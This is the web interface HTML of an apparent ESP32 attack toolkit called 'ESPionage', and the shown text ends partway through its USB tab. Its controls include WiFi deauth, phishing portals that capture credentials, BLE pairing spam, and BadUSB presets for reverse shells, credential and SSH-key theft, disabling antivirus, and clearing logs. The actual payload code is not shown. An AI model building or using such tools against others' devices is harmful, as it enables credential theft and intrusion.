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+xYYwPvGCs+4BcYrqkzNmpdXme4T9kq+Xo02GjMF3YPPxlgfBCDgWoPkucev9AmnbsG+PvfpVvzWrS4EIIBhwuS1BL9ZhXa+HSnstCGnncreVnn2Qg8CEADXHijnKVw9/fceoowABABgGjwAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQACAA2QkAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQAAAAhAAgAAEACAAAQAIQACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAAACEACAAAQAIAABAAhAAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABAAgAAEACEAAAAIQAIAABABwyf8BcZ9VjZr1pNoAAAAASUVORK5CYII=" alt="ESPionage" class="logo-img">
    <span class="version">v0.3.0</span>
  </div>
  <div class="stats">
    <span id="uptime">0s</span>
    <span id="heap">&mdash;</span>
  </div>
</header>

<nav>
  <button data-tab="home" class="active"><div class="ico">&#127968;</div><div class="lbl">Home</div></button>
  <button data-tab="wifi"><div class="ico">&#128225;</div><div class="lbl">WiFi</div></button>
  <button data-tab="ble"><div class="ico">&#128280;</div><div class="lbl">BLE</div></button>
  <button data-tab="broadcast"><div class="ico">&#128227;</div><div class="lbl">Broadcast</div></button>
  <button data-tab="portal"><div class="ico">&#127907;</div><div class="lbl">Portal</div></button>
  <button data-tab="usb"><div class="ico">&#128268;</div><div class="lbl">USB</div></button>
  <button data-tab="system"><div class="ico">&#9881;</div><div class="lbl">System</div></button>
</nav>

<div id="conflict-banner" style="display:none;position:sticky;top:0;z-index:200;background:#f59e0b;color:#1a1a1a;padding:10px 16px;font-size:13px;font-weight:600;align-items:center;gap:10px;justify-content:space-between">
  <span id="conflict-msg"></span>
  <button onclick="conflictStop()" style="background:#1a1a1a;color:#f59e0b;border:none;border-radius:6px;padding:4px 12px;font-size:12px;font-weight:700;cursor:pointer">Stop conflicting feature</button>
</div>

<main>
  <!-- HOME -->
  <section id="home" class="tab active">
    <div class="mode-banner" id="modeBanner">Idle</div>
    <div class="cards">
      <div class="card stat"><div class="v" id="stat-uptime">0</div><div class="l">uptime</div></div>
      <div class="card stat"><div class="v" id="stat-heap">0</div><div class="l">free kb</div></div>
      <div class="card stat"><div class="v" id="stat-clients">0</div><div class="l">clients</div></div>
    </div>

    <h3>Scenes <button class="ibtn" onclick="showInfo('scenes')">i</button></h3>
    <div class="scene-grid">
      <button class="scene" data-scene="demo" onclick="runScene('demo')">
        <div class="sc-ico">&#127916;</div>
        <div class="sc-name">Demo</div>
        <div class="sc-desc">Probe sniff: captures SSIDs nearby phones remember. Passive &amp; silent.</div>
      </button>
      <button class="scene" data-scene="chill" onclick="runScene('chill')">
        <div class="sc-ico">&#9749;</div>
        <div class="sc-name">Chill</div>
        <div class="sc-desc">Rickroll portal. Anyone who connects gets the video.</div>
      </button>
      <button class="scene" data-scene="recon" onclick="runScene('recon')">
        <div class="sc-ico">&#128373;</div>
        <div class="sc-name">Recon</div>
        <div class="sc-desc">Wardrive + AirTag detection running together.</div>
      </button>
      <button class="scene" data-scene="honeypot" onclick="runScene('honeypot')">
        <div class="sc-ico">&#127855;</div>
        <div class="sc-name">Honeypot</div>
        <div class="sc-desc">"Free WiFi" rogue AP + Google portal. Catches creds from joiners.</div>
      </button>
      <button class="scene danger" data-scene="panic" onclick="runScene('panic')">
        <div class="sc-ico">&#128165;</div>
        <div class="sc-name">Panic</div>
        <div class="sc-desc">Mix BLE spam. Pops up across every phone OS.</div>
      </button>
      <button class="scene danger" data-scene="chaos" onclick="runScene('chaos')">
        <div class="sc-ico">&#127769;</div>
        <div class="sc-name">Chaos</div>
        <div class="sc-desc">Beacon spam flooding WiFi + SSID message.</div>
      </button>
    </div>
    <div class="scene-active" id="scene-active" style="display:none">
      <span class="sa-label">Scene:</span>
      <span id="sa-name">\u2014</span>
      <button class="muted" onclick="stop(event)">Stop</button>
    </div>

    <h3>Phone GPS <button class="ibtn" onclick="showInfo('gps')">i</button>
      <button class="ghost" id="gps-btn" onclick="toggleGps()">Enable</button>
    </h3>
    <div class="gps-panel" id="gps-panel" style="display:none">
      <div id="gps-live-view">
        <div class="kv"><span>Latitude</span><span id="gps-lat">\u2014</span></div>
        <div class="kv"><span>Longitude</span><span id="gps-lon">\u2014</span></div>
        <div class="kv"><span>Accuracy</span><span id="gps-acc">\u2014</span></div>
        <div class="kv"><span>Altitude</span><span id="gps-alt">\u2014</span></div>
        <div class="kv"><span>Speed</span><span id="gps-spd">\u2014</span></div>
        <div class="kv"><span>Heading</span><span id="gps-hdg">\u2014</span></div>
        <div class="kv"><span>Phone battery</span><span id="gps-bat">\u2014</span></div>
        <div class="kv"><span>Last update</span><span id="gps-age">\u2014</span></div>
        <div class="row" style="margin-top:8px">
          <button class="muted" onclick="copyGps()">Copy</button>
          <a id="gps-map" class="btn-link" href="#" target="_blank">Open in Maps</a>
        </div>
      </div>
      <div id="gps-error" style="display:none" class="note">
        <strong>Geolocation blocked.</strong><br>
        Browsers only allow GPS on HTTPS or localhost. ESPionage serves plain HTTP so the API refuses.<br>
        <br><b>Workarounds:</b>
        <ul style="margin:6px 0 10px 18px;font-size:13px;line-height:1.5">
          <li><b>Android Chrome:</b> open <code>chrome://flags/#unsafely-treat-insecure-origin-as-secure</code>, add <code>http://192.168.4.1</code>, enable, relaunch Chrome.</li>
          <li><b>iOS Safari:</b> no flag for this. Use Manual Fix below or paste coords from Maps.</li>
          <li><b>Desktop:</b> same flag exists in Chrome.</li>
        </ul>
      </div>
      <div id="gps-manual" style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border)">
        <h4 style="font-size:11px;color:var(--muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Manual fix</h4>
        <div class="row">
          <input id="gps-m-lat" placeholder="lat e.g. 40.7128" type="number" step="0.000001">
          <input id="gps-m-lon" placeholder="lon e.g. -74.006" type="number" step="0.000001">
        </div>
        <button class="muted" onclick="submitManualGps()">Set fix</button>
      </div>
    </div>

    <h3>Activity <button class="ibtn" onclick="showInfo('activity')">i</button>
      <button class="ghost" onclick="refreshActivity()">&#8635;</button>
      <button class="ghost" onclick="exportActivity()" title="Export TXT">&#8595; TXT</button>
    </h3>
    <div class="list activity" id="activity-list"></div>

    <button class="block muted" onclick="stop(event)">&#9632; Stop all</button>
  </section>

  <!-- WIFI -->
  <section id="wifi" class="tab">
    <h2>WiFi Tools</h2>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Scan networks</strong><div class="desc">List every AP nearby.</div></div>
        <button class="ibtn" onclick="showInfo('wifiscan')">i</button>
      </div>
      <div class="row">
        <button onclick="setMode(1)">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
        <button class="muted" onclick="refreshWifi()">&#8635;</button>
        <button class="ghost" onclick="exportWifi()" title="Export CSV">&#8595; CSV</button>
      </div>
      <div class="status" id="wifi-status">&mdash;</div>
      <label class="filter"><input type="checkbox" id="wifi-hide-hidden" onchange="refreshWifi();populateFinderTargets()"> Hide unnamed (hidden SSIDs)</label>
      <div class="list" id="wifi-list"></div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>&#127919; WiFi Finder</strong><div class="desc">Estimate distance in meters from a target router.</div></div>
        <button class="ibtn" onclick="showInfo('wififinder')">i</button>
      </div>
      <div class="row">
        <select id="finder-target"></select>
        <button onclick="startFinder()">Lock</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="finder-panel" id="wifi-finder-panel" style="display:none">
        <div class="finder-distance"><span id="fd-meters">&mdash;</span><span class="unit">m</span></div>
        <div class="finder-rssi"><span id="fd-rssi">&mdash;</span> dBm &middot; ch <span id="fd-ch">&mdash;</span></div>
        <div class="finder-bar"><div class="fill" id="fd-bar"></div></div>
        <div class="finder-trend" id="fd-trend">&hellip;</div>
        <div class="row">
          <button class="muted" onclick="calibrateFinder()">Calibrate 1m</button>
          <select id="finder-env" onchange="setFinderEnv(this.value)">
            <option value="2.0">Free space</option>
            <option value="2.7">Open office</option>
            <option value="3.0" selected>Indoor home</option>
            <option value="4.0">Through walls</option>
          </select>
        </div>
      </div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Probe sniffer</strong><div class="desc">Captures what SSIDs phones have connected to before.</div></div>
        <button class="ibtn" onclick="showInfo('probesniff')">i</button>
      </div>
      <div class="row">
        <button onclick="setMode(8)">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
        <button class="muted" onclick="refreshProbes()">&#8635;</button>
        <button class="ghost" onclick="exportProbes()" title="Export CSV">&#8595; CSV</button>
      </div>
      <div class="status" id="probe-status">&mdash;</div>
      <div class="list" id="probe-list"></div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Wardrive logger</strong><div class="desc">Log all APs for WiGLE.net uploading.</div></div>
        <button class="ibtn" onclick="showInfo('wardrive')">i</button>
      </div>
      <div class="row">
        <button onclick="setMode(10)">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
        <a href="/api/wardrive/csv" download="wardrive.csv" class="ghost">&#8595; CSV</a>
      </div>
      <div class="status" id="wardrive-status">&mdash;</div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>&#9888; Deauth attack</strong><div class="desc">Kick clients off a target network.</div></div>
        <button class="ibtn" onclick="showInfo('deauth')">i</button>
      </div>
      <div class="row">
        <select id="deauth-target"></select>
        <button class="danger" onclick="startDeauth()">Attack</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="status" id="deauth-status">&mdash;</div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Rogue AP</strong><div class="desc">Broadcast a single open AP with any name.</div></div>
        <button class="ibtn" onclick="showInfo('rogueap')">i</button>
      </div>
      <p class="desc warn" style="margin:0 0 8px">&#9888; While active, WiFi scanning on this tab won&apos;t show real networks. Use the Portal tab to stop it.</p>
      <input id="rogue-ssid" placeholder="SSID" value="FreeWifi">
      <div class="row">
        <button class="danger" onclick="startRogue()">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="status" id="rogue-status"></div>
    </div>
  </section>

  <!-- BLE -->
  <section id="ble" class="tab">
    <h2>BLE Tools</h2>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Scan devices</strong><div class="desc">List every Bluetooth device nearby.</div></div>
        <button class="ibtn" onclick="showInfo('blescan')">i</button>
      </div>
      <div class="row">
        <button onclick="setMode(2)">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
        <button class="muted" onclick="refreshBle()">&#8635;</button>
        <button class="ghost" onclick="exportBle()" title="Export CSV">&#8595; CSV</button>
      </div>
      <div class="status" id="ble-status">&mdash;</div>
      <label class="filter"><input type="checkbox" id="ble-hide-unnamed" onchange="refreshBle();populateBleFinderTargets()"> Hide unnamed devices</label>
      <div class="list" id="ble-list"></div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>&#127919; BLE Finder</strong><div class="desc">Track a single device and estimate distance.</div></div>
        <button class="ibtn" onclick="showInfo('blefinder')">i</button>
      </div>
      <div class="row">
        <select id="bfinder-target"></select>
        <button onclick="startBleFinder()">Lock</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="finder-panel" id="ble-finder-panel" style="display:none">
        <div class="finder-distance"><span id="bfd-meters">&mdash;</span><span class="unit">m</span></div>
        <div class="finder-rssi"><span id="bfd-rssi">&mdash;</span> dBm</div>
        <div class="finder-bar"><div class="fill" id="bfd-bar"></div></div>
        <div class="finder-trend" id="bfd-trend">&hellip;</div>
        <div class="row">
          <button class="muted" onclick="calibrateFinder()">Calibrate 1m</button>
        </div>
      </div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>AirTag detector</strong><div class="desc">Alerts if any Find My tag follows you for 3+ min.</div></div>
        <button class="ibtn" onclick="showInfo('airtag')">i</button>
      </div>
      <div class="row">
        <button onclick="setMode(11)">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="status" id="airtag-status">&mdash;</div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>&#127522; AirTag emulator</strong><div class="desc">Broadcast a FindMy advertisement — nearby iPhones will eventually show an "AirTag Found" alert.</div></div>
        <button class="ibtn" onclick="showInfo('airtagemu')">i</button>
      </div>
      <label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">Label name (shown in BLE scan)</label>
      <input id="airtag-emu-name" placeholder="AirTag" value="AirTag">
      <div class="row" style="margin-top:6px">
        <button class="danger" onclick="startAirtagEmu()">&#128165; Start</button>
        <button class="muted" onclick="stop(event)">&#9632; Stop</button>
      </div>
      <div class="status" id="airtag-emu-status">&mdash;</div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Custom advertiser</strong><div class="desc">Make the ESP32 show up as any BLE name.</div></div>
        <button class="ibtn" onclick="showInfo('customadv')">i</button>
      </div>
      <input id="adv-name" placeholder="Display name" value="Jake's AirPods Pro">
      <div class="row">
        <button onclick="startAdv()">Broadcast</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
    </div>

    <div class="feature" id="ble-hid-card">
      <div class="feature-head">
        <div><strong>&#128507; BLE HID</strong><div class="desc">Pair as a wireless keyboard &amp; mouse to any phone or laptop.</div></div>
        <button class="ibtn" onclick="showInfo('blehid')">i</button>
      </div>
      <label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">Device name (shown during pairing)</label>
      <div class="row" style="margin-bottom:6px">
        <input id="ble-hid-name" placeholder="ESPionage KB" value="ESPionage KB" style="flex:1">
      </div>
      <div class="status" id="ble-hid-status">&#9679; Not started</div>
      <div class="row" style="margin-top:6px">
        <button id="ble-hid-adv-btn" onclick="bleHidBegin()">&#128268; Start pairing</button>
        <button class="muted" onclick="bleHidStop()">&#9632; Stop</button>
      </div>
      <p class="ducky-step-hint" style="margin-top:8px">Once paired, use the controls below to send keystrokes or toggle the mouse jiggler over Bluetooth.</p>

      <hr style="margin:10px 0;border-color:var(--border)">

      <div class="ducky-step">Step 1 &mdash; Choose a script</div>
      <div class="grid2" id="ble-scene-grid" style="margin-bottom:8px">
        <button class="scene" onclick="loadBleHid('hello')">&#128075; Hello</button>
        <button class="scene" onclick="loadBleHid('open_many_tabs')">&#127760; Tab bomb</button>
        <button class="scene" onclick="loadBleHid('speak_text')">&#128266; Speak text</button>
        <button class="scene" onclick="loadBleHid('screenshot')">&#128247; Screenshot</button>
      </div>

      <div class="ducky-step">Step 2 &mdash; Edit payload</div>
      <textarea id="ble-hid-payload" rows="6" placeholder="Ducky script&#10;STRING Hello from ESPionage&#10;ENTER"></textarea>
      <label style="font-size:12px;display:flex;align-items:center;gap:6px;margin:4px 0 8px">
        <input type="checkbox" id="ble-hid-loop"> Loop script
      </label>

      <div class="ducky-step">Step 3 &mdash; Run</div>
      <div class="row">
        <button onclick="bleHidRun()">&#9654; Run payload</button>
        <button class="muted" onclick="bleHidStopScript()">&#9632; Stop</button>
      </div>

      <hr style="margin:10px 0;border-color:var(--border)">

      <div class="ducky-step">Mouse jiggler</div>
      <div class="row" style="margin-top:4px">
        <label style="font-size:12px">Interval (s)&nbsp;<input type="number" id="ble-jiggle-interval" value="30" min="5" max="300" style="width:56px"></label>
        <button id="ble-jiggle-btn" onclick="toggleBleJiggler()">&#128640; Start jiggler</button>
      </div>
    </div>
  </section>

  <!-- BROADCAST -->
  <section id="broadcast" class="tab">
    <h2>Broadcast &amp; Spam</h2>
    <p class="desc warn">&#9888; These features can interfere with nearby devices. Use only on hardware you own.</p>

    <div class="feature" id="applejuice-card">
      <div class="feature-head">
        <div><strong>&#127822; Apple Juice</strong><div class="desc">Spam a specific Apple device pairing popup at nearby iPhones/iPads.</div></div>
        <button class="ibtn" onclick="showInfo('applejuice')">i</button>
      </div>
      <div class="aj-cats">
        <button class="aj-cat active" data-cat="audio" onclick="ajSetCat('audio',this)">&#127911; Audio</button>
        <button class="aj-cat" data-cat="setup" onclick="ajSetCat('setup',this)">&#128241; Action Modal</button>
      </div>
      <div id="aj-device-grid" class="aj-grid"></div>
      <div class="status" id="aj-status">Select a device above</div>
      <div class="row" style="margin-top:6px">
        <button id="aj-random-btn" class="danger" onclick="ajSpamRandom()">&#127922; Random (all Apple)</button>
        <button class="muted" onclick="setMode(0)">&#9632; Stop</button>
      </div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>BLE pairing popups</strong><div class="desc">Trigger pairing popups for Google, Samsung &amp; Windows devices.</div></div>
        <button class="ibtn" onclick="showInfo('blespam')">i</button>
      </div>
      <div class="grid2">
        <button class="danger" onclick="setMode(5)">&#129302; Google<br><small>Pixel / Sony</small></button>
        <button class="danger" onclick="setMode(6)">&#128241; Samsung<br><small>Galaxy Buds</small></button>
        <button class="danger" onclick="setMode(7)">&#129713; Windows<br><small>Swift Pair</small></button>
        <button class="danger" onclick="setMode(14)">&#128165; Mix all<br><small>All vendors</small></button>
      </div>
      <div class="row" style="margin-top:8px">
        <button class="block muted" onclick="setMode(0)">&#9632; Stop</button>
      </div>
      <div class="status" id="spam-status">Idle</div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Beacon spam</strong><div class="desc">Fake WiFi networks broadcasted from your area.</div></div>
        <button class="ibtn" onclick="showInfo('beacon')">i</button>
      </div>
      <textarea id="spam-ssids" placeholder="One SSID per line (leave blank for meme list)"></textarea>
      <div class="row">
        <button class="danger" onclick="startBeacon()">Start</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>SSID message</strong><div class="desc">Broadcast text as numbered SSIDs.</div></div>
        <button class="ibtn" onclick="showInfo('ssidmsg')">i</button>
      </div>
      <input id="ssid-msg" placeholder="HELLO_WORLD" value="HELLO FROM ESPIONAGE">
      <div class="row">
        <button onclick="startSsidMsg()">Broadcast</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
    </div>
  </section>

  <!-- PORTAL -->
  <section id="portal" class="tab">
    <h2>Evil Portal</h2>
    <p class="desc warn">&#9888; Only use on your own test network. Capturing credentials from others is illegal.</p>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Pick a template</strong><div class="desc">Fake login pages. Tap card to preview.</div></div>
        <button class="ibtn" onclick="showInfo('portal')">i</button>
      </div>
      <div class="portal-grid">
        <div class="portal-pick" data-tmpl="google"><div class="pt-ico">G</div><div>Google</div></div>
        <div class="portal-pick" data-tmpl="apple"><div class="pt-ico">&#63743;</div><div>Apple ID</div></div>
        <div class="portal-pick" data-tmpl="facebook"><div class="pt-ico">f</div><div>Facebook</div></div>
        <div class="portal-pick" data-tmpl="instagram"><div class="pt-ico">&#9753;</div><div>Instagram</div></div>
        <div class="portal-pick" data-tmpl="chrome"><div class="pt-ico">&#9901;</div><div>Chrome update</div></div>
        <div class="portal-pick" data-tmpl="hotel"><div class="pt-ico">&#127976;</div><div>Hotel WiFi</div></div>
        <div class="portal-pick" data-tmpl="router"><div class="pt-ico">&#128225;</div><div>Router admin</div></div>
        <div class="portal-pick" data-tmpl="wifi"><div class="pt-ico">&#128246;</div><div>Generic WiFi</div></div>
        <div class="portal-pick" data-tmpl="rickroll"><div class="pt-ico">&#127925;</div><div>Rickroll</div></div>
      </div>
      <div class="row">
        <a class="button-link muted" id="portal-preview" href="/portal-login" target="_blank">Preview &#x2197;</a>
        <button class="danger" onclick="startPortal()">Start Portal</button>
        <button class="muted" onclick="stop(event)">Stop</button>
      </div>
      <div class="status" id="portal-status">Idle &middot; selected: <span id="portal-selected">google</span></div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Captured credentials</strong><div class="desc">Everything POSTed to the fake page.</div></div>
        <button class="ibtn" onclick="showInfo('creds')">i</button>
      </div>
      <div class="row" style="margin-bottom:6px">
        <button class="muted" onclick="refreshCreds()">&#8635; Refresh</button>
        <button class="ghost" onclick="exportCreds()" title="Export CSV">&#8595; CSV</button>
      </div>
      <div class="list" id="portal-creds"></div>
    </div>
  </section>

  <!-- USB -->
  <section id="usb" class="tab">
    <h2>USB Tools</h2>

    <div class="usb-status-banner" id="usb-banner">
      <span id="usb-chip-icon">&#10067;</span>
      <div>
        <div id="usb-banner-title">Checking compatibility&hellip;</div>
        <div id="usb-banner-sub" style="font-size:11px;color:var(--muted);margin-top:2px"></div>
      </div>
    </div>

    <!-- Target OS selector -->
    <div class="os-toggle" id="usb-os-toggle">
      <span class="os-label">Target OS:</span>
      <button class="os-btn" id="os-btn-windows" onclick="setTargetOs('windows')">🪟 Windows</button>
      <button class="os-btn" id="os-btn-mac" onclick="setTargetOs('mac')">🍎 macOS</button>
    </div>

    <div id="usb-features">

      <div class="feature" id="usb-hid-card">
        <div class="feature-head">
          <div><strong>&#9000; BadUSB / Rubber Ducky</strong><div class="desc">ESPionage types a Ducky-style payload into the target machine as if it were a USB keyboard.</div></div>
          <button class="ibtn" onclick="showInfo('usbhid')">i</button>
        </div>

        <div class="ducky-step">1. Pick a preset <span class="ducky-step-hint">(or skip to step 2 to write your own)</span></div>
        <div class="scene-grid" id="ducky-scene-grid" style="grid-template-columns:repeat(2,1fr)">
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('reverse_shell')">
            <div class="sc-ico">&#128268;</div><div class="sc-name">Reverse shell</div>
            <div class="sc-desc">Call back to an IP you set (PowerShell / bash).</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('exfil_wifi')">
            <div class="sc-ico">&#128225;</div><div class="sc-name">WiFi cred dump</div>
            <div class="sc-desc">Windows: saved passwords. Mac: preferred networks.</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('add_user')">
            <div class="sc-ico">&#128272;</div><div class="sc-name">Add admin user</div>
            <div class="sc-desc">Creates a hidden admin account.</div>
          </button>
          <button class="scene danger" data-platforms="windows" onclick="loadDucky('disable_defender')">
            <div class="sc-ico">&#128737;</div><div class="sc-name">Disable Defender</div>
            <div class="sc-desc">Turns off Windows Defender real-time protection.</div>
          </button>
          <button class="scene danger" data-platforms="mac" onclick="loadDucky('disable_defender')">
            <div class="sc-ico">&#128737;</div><div class="sc-name">Disable Gatekeeper</div>
            <div class="sc-desc">Allows unsigned apps to run (requires admin).</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('disable_firewall')">
            <div class="sc-ico">&#128293;</div><div class="sc-name">Disable firewall</div>
            <div class="sc-desc">Kills the host firewall.</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('enable_remote')">
            <div class="sc-ico">&#128225;</div><div class="sc-name">Enable remote access</div>
            <div class="sc-desc">Win: enables RDP. Mac: enables SSH / Remote Login.</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('change_dns')">
            <div class="sc-ico">&#127758;</div><div class="sc-name">Hijack DNS</div>
            <div class="sc-desc">Points DNS resolvers to an attacker-controlled server.</div>
          </button>
          <button class="scene danger" data-platforms="windows,mac" onclick="loadDucky('persistence')">
            <div class="sc-ico">&#128274;</div><div class="sc-name">Persistence</div>
            <div class="sc-desc">Win: Run registry key. Mac: LaunchAgent plist.</div>
          </button>
          <button class="scene danger" data-platforms="windows" onclick="loadDucky('clear_logs')">
            <div class="sc-ico">&#128465;</div><div class="sc-name">Clear event logs</div>
            <div class="sc-desc">Wipes Windows event logs (anti-forensics).</div>
          </button>
          <button class="scene danger" data-platforms="mac" onclick="loadDucky('exfil_ssh_keys')">
            <div class="sc-ico">&#128273;</div><div class="sc-name">Steal SSH keys</div>
            <div class="sc-desc">Copies ~/.ssh/ to /tmp and uploads via curl.</div>
          </button>
          <button class="scene danger" data-platforms="windows" onclick="loadDucky('browser_creds')">
            <div class="sc-ico">&#128279;</div><div class="sc-name">Browser creds</div>
            <div class="sc-desc">Grabs Chrome Login Data SQLite to Desktop.</div>
          </button>
          <button class="scene" data-platforms="windows,mac" onclick="loadDucky('open_rickroll')">
            <div class="sc-ico">&#129340;</div><div class="sc-name">Rickroll</div>
            <div class="sc-desc">Opens YouTube Rickroll.</div>
          </button>
          <button class="scene" data-platforms="windows,mac" onclick="loadDucky('lock_screen')">
            <div class="sc-ico">&#128274;</div><div class="sc-name">Lock screen</div>
            <div class="sc-desc" id="lock-screen-desc">Instantly locks the workstation.</div>
          </button>
          <button class="scene" data-platforms="windows,mac" onclick="loadDucky('screenshot')">
            <div class="sc-ico">&#128247;</div><div class="sc-name">Screenshot</div>
